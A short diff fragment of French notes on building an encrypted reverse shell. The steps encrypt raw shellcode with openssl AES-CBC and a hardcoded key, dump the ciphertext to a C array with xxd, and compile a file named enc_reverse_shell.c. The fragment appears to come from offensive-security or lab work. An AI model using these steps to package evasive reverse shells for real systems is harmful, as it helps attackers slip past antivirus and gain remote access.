@@ -5,3 +5,4 @@ openssl enc -aes-128-cbc -nosalt -e -in shell.raw -out shell.enc -K '2b7e151628a
 Recuperer le ciphertext : 
 xxd -i shell.enc > shellcode.c > ciphertext to C tab
 
+gcc enc_reverse_shell.c -lcrypto -lssl
